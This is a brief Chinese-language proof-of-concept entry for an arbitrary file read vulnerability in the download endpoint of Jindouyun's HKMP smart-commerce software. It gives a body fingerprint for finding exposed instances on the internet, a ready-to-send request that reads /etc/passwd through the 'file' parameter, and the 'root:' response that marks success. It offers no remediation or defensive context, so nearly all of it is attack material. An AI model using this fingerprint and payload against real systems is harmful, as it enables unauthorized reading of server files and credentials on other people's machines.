# 金斗云HKMP智慧商业软件download任意文件读取漏洞

金斗云HKMP智慧商业软件download ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="金斗云 Copyright"`
- **请求**：`GET /admin/log/download?file=/etc/passwd HTTP/1.1`
- **响应特征**：200 root: